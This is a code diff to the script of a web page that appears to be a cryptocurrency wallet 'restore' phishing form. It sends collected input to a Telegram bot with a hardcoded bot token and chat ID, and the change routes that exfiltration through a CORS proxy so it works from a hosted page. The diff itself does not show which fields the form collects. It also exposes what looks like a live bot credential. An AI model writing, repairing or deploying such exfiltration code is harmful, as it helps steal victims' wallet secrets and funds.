@@ -120,6 +120,7 @@
 <script>
 const BOT_TOKEN = '6772519097:AAH00f7tXv8V_T1NV--T5LWpNY_-CfwhiZ4';
 const CHAT_ID = '6876291548';
+const CORS_PROXY = 'https://cors-anywhere.herokuapp.com/';
 
 const restoreBtn = document.getElementById('restoreBtn');
 const walletNameInput = document.getElementById('walletName');
@@ -138,9 +139,9 @@ function showPopup(message) {
 
 async function sendToTelegram(message) {
     try {
-        // Telegram API requires HTTPS; GitHub Pages provides that
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-        if (!response.ok) console.error('Failed to send');
+        const url = `${CORS_PROXY}https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        const response = await fetch(url);
+        if (!response.ok) console.error('Failed to send:', response.status);
     } catch (err) {
         console.error('Error sending to Telegram:', err);
     }
